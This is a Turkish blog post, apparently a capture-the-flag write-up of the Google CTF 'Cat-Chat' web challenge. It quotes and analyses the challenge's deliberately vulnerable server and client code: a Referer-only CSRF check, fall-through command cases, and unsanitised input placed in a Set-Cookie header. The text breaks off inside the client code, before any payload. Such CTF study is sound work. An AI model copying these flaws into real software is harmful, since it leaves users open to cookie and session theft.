<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Cat-Chat  - Google CTF | anal.school</title><meta name="description" content="bir çeşit ilim evi"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Cat-Chat  - Google CTF | anal.school"><meta name="twitter:description" content="bir çeşit ilim evi"><meta name="twitter:image" content="https://anal.school/img/twit-banner.webp"><script async src="https://www.googletagmanager.com/gtag/js?id=UA-118381182-2"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'UA-118381182-2');</script><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
 font-display: swap;
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 font-display: swap;
}</style><meta name="generator" content="Hexo 5.2.0"></head><body><header><nav><a href="/">Home</a><a href="/archives/">Archives</a><a href="/about/">About</a></nav></header><main><article><div id="post-bg"><div id="post-title"><div id="post-info"><span>date:<time datetime="2018-06-28T10:59:40.000Z" id="date"> 2018-06-28</time></span></div><h1>Cat-Chat  - Google CTF</h1><hr></div><div id="post-content"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">You discover this cat enthusiast chat app, but the annoying thing about it is that you’re always banned when you start talking about dogs. Maybe if you would somehow get to know the admin’s password, you could fix that.<br><br>https:&#x2F;&#x2F;cat-chat.web.ctfcompetition.com&#x2F;<br></code></pre></td></tr></table></figure>

<h3 id="On-inceleme"><a href="#On-inceleme" class="headerlink" title="Ön inceleme"></a>Ön inceleme</h3><ul>
<li><strong>/name yeni_isim</strong> ile isim değiştiriliyor</li>
<li><strong>/report</strong> dediğimiz zaman <strong>Dog talk</strong> konuşanları <strong>gelip</strong> banlıyor</li>
<li>kaynak kodu verilmiş</li>
</ul>
<p><img src="cat-chat1.png" alt="ilkEkran"></p>
<p>Bizden istenilen ise admin parolası veya session bilgisi. Kafamızda direk XSS sorusu dedik kendi kendimize.</p>
<p><strong>/report</strong>‘u deniyelim</p>
<p><img src="cat-chat2.png" alt="ilkEkran"></p>
<p><strong>iv3m</strong> kullanıcısından reportlayıp <strong>roll</strong> kullanıcısından <strong>dog</strong> yazdık. Ve <strong>admin</strong> gelip <strong>roll</strong> kullanıcısını banladı.(<strong>ban</strong> adlı cookie’yi 1 olarak set etti)</p>
<ul>
<li>Admin geldiğine göre bunu bir köşeye yazalım.</li>
</ul>
<h3 id="Analiz-ve-hata-kesfi"><a href="#Analiz-ve-hata-kesfi" class="headerlink" title="Analiz ve hata keşfi"></a>Analiz ve hata keşfi</h3><p>Kaynak koduna baktığımızda(html source)</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Cat Chat<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/catchat.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/style.css&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;panel&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;conversation&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Welcome to Cat Chat! This is your brand new room where you can discuss anything related to cats. You have been assigned a random nick name that you can change any time.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Rules:<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>- You may invite anyone to this chat room. Just share the URL.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>- Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Commands you can use: (just type a message starting with slash to invoke commands)<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>- `/name YourNewName` - Change your nick name to YourNewName.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>- `/report` - Report dog talk to the admin.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">        Admin commands:</span><br><span class="hljs-comment">        - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It&#x27;s enough to set it once a year, so no need to issue a /secret command every time you open a chat room.</span><br><span class="hljs-comment">        - `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).</span><br><span class="hljs-comment">      --&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Btw, the core of the chat engine is open source! You can download the source code <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/server.js&quot;</span>&gt;</span>here<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;margin-bottom: 5em&quot;</span>&gt;</span>Alright, have fun!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;messagebox&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
<p>( tüm kodu yapıştırma sebebim belki soruları geri bulamayız )</p>
<p>2 adet admin komutu öğrenmiş olduk</p>
<ul>
<li><strong>/secret xxx</strong> komutu <strong>flag</strong> adlı cookie’yi <strong>xxx</strong> olarak set ediyor.</li>
<li><strong>/ban kullanıcıAdı</strong> admin şifresi yani flag doğru ise hedef kişiyi banlıyor.</li>
</ul>
<h4 id="Server-side-kod-inceleme"><a href="#Server-side-kod-inceleme" class="headerlink" title="Server-side kod inceleme"></a>Server-side kod inceleme</h4><p>Back-end tarafını bizimle paylaşmıştı <a target="_blank" rel="noopener" href="https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/server.js">server.js</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> cookieParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;cookie-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> uuidv4 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid/v4&#x27;</span>);<br><span class="hljs-keyword">const</span> SSEClient = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;sse&#x27;</span>).Client;<br><span class="hljs-keyword">const</span> admin = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;./admin&#x27;</span>);<br><span class="hljs-keyword">const</span> pubsub = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;@google-cloud/pubsub&#x27;</span>)();<br></code></pre></td></tr></table></figure>
<p>Temal kütüphane importları ve <strong>admin.js</strong>‘i import ediyor. Malesef <strong>admin.js</strong>‘e erişimimiz yok</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> app = express();<br>app.set(<span class="hljs-string">&#x27;etag&#x27;</span>, <span class="hljs-literal">false</span>);<br>app.use(cookieParser());<br></code></pre></td></tr></table></figure>
<p><strong>app.set(‘etag’, false)</strong> entity-tag kapatılmış. Anlayacağımız web-cache validation yok.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">app.use(admin.middleware);<br></code></pre></td></tr></table></figure>
<p><strong>flag</strong> cookiesi’ni kontrol edip admin mi değil mi diye kontrol ediyor</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js">app.use(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span> (req.cookies.banned) &#123;<br>    res.sendStatus(<span class="hljs-number">403</span>);<br>    res.end();<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    next();<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>Kullanıcı’nın banlı olup olmadığını kontrol ediyor. Eğer banlı ise <strong>403</strong> sayfasına yönlendiriyor.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> res.redirect(<span class="hljs-string">`/room/<span class="hljs-subst">$&#123;uuidv4()&#125;</span>/`</span>));<br><span class="hljs-keyword">let</span> roomPath = <span class="hljs-string">&#x27;/room/:room([0-9a-f-]&#123;36&#125;)&#x27;</span>;<br>app.get(roomPath + <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.sendFile(__dirname + <span class="hljs-string">&#x27;/static/index.html&#x27;</span>, &#123;<br>    headers: &#123;<br>      <span class="hljs-string">&#x27;Content-Security-Policy&#x27;</span>: [<br>        <span class="hljs-string">&#x27;default-src \&#x27;self\&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;style-src \&#x27;unsafe-inline\&#x27; \&#x27;self\&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;script-src \&#x27;self\&#x27; https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/&#x27;</span>,<br>        <span class="hljs-string">&#x27;frame-src \&#x27;self\&#x27; https://www.google.com/recaptcha/&#x27;</span>,<br>      ].join(<span class="hljs-string">&#x27;; &#x27;</span>)<br>    &#125;,<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>eğer <strong>/</strong> dizinine gidersek bize benzersiz bir id atayıp <strong>/static/index.html</strong>‘in içeriğini göstercekmiş. Ayrıca <a target="_blank" rel="noopener" href="https://www.netsparker.com.tr/blog/web-guvenligi/CSP-Content-Security-Policy/"><strong>CSP</strong></a> kısıtlamaları ve ayrıcalıkları verilmiş.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">&#x27;style-src \&#x27;unsafe-inline\&#x27; \&#x27;self\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
<p>kısmını unutmamakta fayda var. Yani inline şekilde olan style ayarlarına izin var.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs js">app.all(roomPath + <span class="hljs-string">&#x27;/send&#x27;</span>, <span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> room = req.params.room, &#123;msg, name&#125; = req.query, response = &#123;&#125;, arg;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;room&#125;</span> &lt;-- (<span class="hljs-subst">$&#123;name&#125;</span>):`</span>, msg)<br>  <span class="hljs-keyword">if</span> (!(req.headers.referer || <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/^https?:\/\//</span>, <span class="hljs-string">&#x27;&#x27;</span>).startsWith(req.headers.host)) &#123;<br>    response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;CSRF protection error&#x27;</span>&#125;;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msg[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>    broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;msg&#x27;</span>, name, msg&#125;);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">switch</span> (msg.match(<span class="hljs-regexp">/^\/[^ ]*/</span>)[<span class="hljs-number">0</span>]) &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/name&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/name (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>        response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;rename&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>]&#125;;<br>        broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>], <span class="hljs-attr">old</span>: name&#125;);<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/ban&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/ban (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">if</span> (!req.admin) <span class="hljs-keyword">break</span>;<br>        broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ban&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>]&#125;);<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/secret&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/secret (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>        res.setHeader(<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>, <span class="hljs-string">&#x27;flag=&#x27;</span> + arg[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;; Path=/; Max-Age=31536000&#x27;</span>);<br>        response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;secret&#x27;</span>&#125;;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/report&#x27;</span>:<br>        <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/report (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">var</span> ip = req.headers[<span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>];<br>        ip = ip ? ip.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">0</span>] : req.connection.remoteAddress;<br>        response = <span class="hljs-keyword">await</span> admin.report(arg[<span class="hljs-number">1</span>], ip, <span class="hljs-string">`https://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/room/<span class="hljs-subst">$&#123;room&#125;</span>/`</span>);<br>    &#125;<br>  &#125;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">`<span class="hljs-subst">$&#123;room&#125;</span> --&gt; (<span class="hljs-subst">$&#123;name&#125;</span>):`</span>, response)<br>  res.json(response);<br>  res.status(<span class="hljs-number">200</span>);<br>  res.end();<br>&#125;);<br></code></pre></td></tr></table></figure>
<p>Geldik mesajlar kısmına.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (!(req.headers.referer || <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-regexp">/^https?:\/\//</span>, <span class="hljs-string">&#x27;&#x27;</span>).startsWith(req.headers.host)) &#123;<br>   response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;CSRF protection error&#x27;</span>&#125;;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><strong>Refer</strong> based CSRF koruması varmış.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (msg[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;/&#x27;</span>) &#123;<br>    broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;msg&#x27;</span>, name, msg&#125;);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>Eğer mesaj <strong>/</strong> ile başlamıyorsa yani komut değilse mesaj olarak yolluyor.</p>
<p>Geldik eğer komutsa kısmına</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/name&#x27;</span>:<br>    <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/name (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>    response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;rename&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>]&#125;;<br>    broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>]old: name&#125;);<br></code></pre></td></tr></table></figure>

<p><strong>/name</strong> ise isim değiştir</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/ban&#x27;</span>:<br>    <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/ban (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">if</span> (!req.admin) <span class="hljs-keyword">break</span>;<br>    broadcast(room, &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ban&#x27;</span>, <span class="hljs-attr">name</span>: arg[<span class="hljs-number">1</span>]&#125;);<br></code></pre></td></tr></table></figure>
<p><strong>/ban xxx</strong> ise ve banlamak isteyen kişi <strong>admin</strong> ise <strong>xx</strong> i banla</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/secret&#x27;</span>:<br>    <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/secret (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>    res.setHeader(<span class="hljs-string">&#x27;Set-Cookie&#x27;</span>, <span class="hljs-string">&#x27;flag=&#x27;</span> + arg[<span class="hljs-number">1</span>] + <span class="hljs-string">&#x27;; Path=/; Max-Age=31536000&#x27;</span>);<br>    response = &#123;<span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;secret&#x27;</span>&#125;;<br></code></pre></td></tr></table></figure>
<p><strong>/secret xxx</strong> ise <strong>flag</strong> cookiesini <strong>xxx</strong> olarak set et.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;/report&#x27;</span>:<br>    <span class="hljs-keyword">if</span> (!(arg = msg.match(<span class="hljs-regexp">/\/report (.+)/</span>))) <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">var</span> ip = req.headers[<span class="hljs-string">&#x27;x-forwarded-for&#x27;</span>];<br>    ip = ip ? ip.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">0</span>] : req.connection.remoteAddress;<br>    response = <span class="hljs-keyword">await</span> admin.report(arg[<span class="hljs-number">1</span>], ip, <span class="hljs-string">`https://<span class="hljs-subst">$&#123;req.headers.host&#125;</span>/room/<span class="hljs-subst">$&#123;room&#125;</span>/`</span>);<br></code></pre></td></tr></table></figure>
<p><strong>/report</strong> ise <strong>admin</strong>‘i çağır. (<strong>x-forwarded-for</strong> niye konulmuş bir fikrim yok ama sanırım ki içerideki reverse proxyden dolayı)</p>
<p>Buraya kadar öğrendiklerimiz </p>
<ul>
<li>İsim değiştirebildiğimiz.</li>
<li><strong>style-src unsafe-inline</strong>‘den dolayı inline şekilde style değişikliği yapabildiğimiz.</li>
<li>flag’in /secret komutuna bağlı olduğu</li>
</ul>
<h4 id="Client-side-kod-inceleme"><a href="#Client-side-kod-inceleme" class="headerlink" title="Client-side kod inceleme"></a>Client-side kod inceleme</h4><p>Geldik Client-side kod inceleme kısmına <a target="_blank" rel="noopener" href="https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/cat-chat.js">cat-chat.js</a></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">let</span> esc = <span class="hljs-function">(<span class="hljs-params">str</span>) =&gt;</span> str.replace(<span class="hljs-regexp">/&lt;/g</span>, <span class="hljs-string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="hljs-regexp">/&gt;/g</span>, <span class="hljs-string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="hljs-regexp">/&quot;/g</span>, <span class="hljs-string">&#x27;&amp;quot;&#x27;</span>).replace(<span class="hljs-regexp">/&#x27;/g</span>, <span class="hljs-string">&#x27;&amp;apos;&#x27;</span>);<br></code></pre></td></tr></table></figure>
<p>Escape fonksiyonuna göre <strong>[‘&gt;’,’&lt;’,’ “ ‘,’ &#39; ‘]</strong> karakterleri yasaklı. Bu kısımıda not edelim.</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params">data</span>) </span>&#123;<br>  (&#123;<br>    <span class="hljs-function"><span class="hljs-title">undefined</span>(<span class="hljs-params">data</span>)</span> &#123;&#125;,<br>    <span class="hljs-function"><span class="hljs-title">error</span>(<span class="hljs-params">data</span>)</span> &#123; display(<span class="hljs-string">`Something went wrong :/ Check the console for error message.`</span>); <span class="hljs-built_in">console</span>.error(data); &#125;,<br>    <span class="hljs-function"><span class="hljs-title">name</span>(<span class="hljs-params">data</span>)</span> &#123; display(<span class="hljs-string">`<span class="hljs-subst">$&#123;esc(data.old)&#125;</span> is now known as <span class="hljs-subst">$&#123;esc(data.name)&#125;</span>`</span>); &#125;,<br>    <span class="hljs-function"><span class="hljs-title">rename</span>(<span class="hljs-params">data</span>)</span> &#123; <span class="hljs-built_in">localStorage</span>.name = data.name; &#125;,<br>    <span class="hljs-function"><span class="hljs-title">secret</span>(<span class="hljs-params">data</span>)</span> &#123; display(<span class="hljs-string">`Successfully changed secret to &lt;span data-secret=&quot;<span class="hljs-subst">$&#123;esc(cookie(<span class="hljs-string">&#x27;flag&#x27;</span>))&#125;</span>&quot;&gt;*****&lt;/span&gt;`</span>); &#125;,<br>    <span class="hljs-function"><span class="hljs-title">msg</span>(<span class="hljs-params">data</span>)</span> &#123;<br>      <span class="hljs-keyword">let</span> you = (data.name == <span class="hljs-built_in">localStorage</span>.name) ? <span class="hljs-string">&#x27; (you)&#x27;</span> : <span class="hljs-string">&#x27;&#x27;</span>;<br>      <span class="hljs-keyword">if</span> (!you &amp;&amp; data.msg == <span class="hljs-string">&#x27;Hi all&#x27;</span>) send(<span class="hljs-string">&#x27;Hi&#x27;</span>);<br>      display(<span class="hljs-string">`&lt;span data-name=&quot;<span class="hljs-subst">$&#123;esc(data.name)&#125;</span>&quot;&gt;<span class="hljs-subst">$&#123;esc(data.name)&#125;</span><span class="hljs-subst">$&#123;you&#125;</span>&lt;/span&gt;: &lt;span&gt;<span class="hljs-subst">$&#123;esc(data.msg)&#125;</span>&lt;/span&gt;`</span>);<br>    &#125;,<br>    <span class="hljs-function"><span class="hljs-title">ban</span>(<span class="hljs-params">data</span>)</span> &#123;<br>      <span class="hljs-keyword">if</span> (data.name == <span class="hljs-built_in">localStorage</span>.name) &#123;<br>        <span class="hljs-built_in">document</span>.cookie = <span class="hljs-string">&#x27;banned=1; 